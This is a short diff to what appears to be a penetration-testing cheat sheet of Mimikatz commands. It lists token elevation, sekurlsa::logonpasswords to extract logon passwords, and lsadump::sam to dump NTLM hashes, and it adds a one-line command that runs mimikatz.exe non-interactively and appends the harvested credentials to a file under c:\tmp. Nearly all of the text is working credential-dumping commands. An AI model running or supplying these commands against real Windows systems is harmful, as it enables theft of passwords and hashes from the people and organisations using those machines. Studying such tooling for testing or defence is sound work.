@@ -7,6 +7,9 @@ token::elevate
 # Extract all passwords possible:
 sekurlsa::logonpasswords
 
+# Automating:
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
+
 # Extract only NTLM hashes from SAM:
 lsadump::sam
 
